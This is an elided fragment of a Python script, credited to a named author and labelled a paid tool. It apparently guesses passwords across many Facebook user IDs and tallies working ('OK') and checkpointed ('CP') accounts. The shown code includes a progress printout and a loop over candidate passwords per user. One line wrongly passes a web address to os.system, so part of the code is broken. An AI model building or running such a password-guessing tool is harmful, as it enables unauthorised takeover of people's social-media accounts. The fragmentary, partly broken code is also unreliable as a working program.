...
|Author   | Md Alamgir Hossen Nishat (Bad-Boy)      |
|Fb Id    | Md. Alamin Islam       |
|GitHub   | atalamin.                 |
| Version |          6.2.0                 |
|___Tools Type:  Paid ___________________________________|
"""
try:
...
def Sad_Boy():
    ...
    if _Sad_Boy___ in ('2', '02'):
        os.system('https://facebook.com/groups/2333311560163796/')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[ALAMIN] {loop}|{len(self.id)} [OK][{len(ok)}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
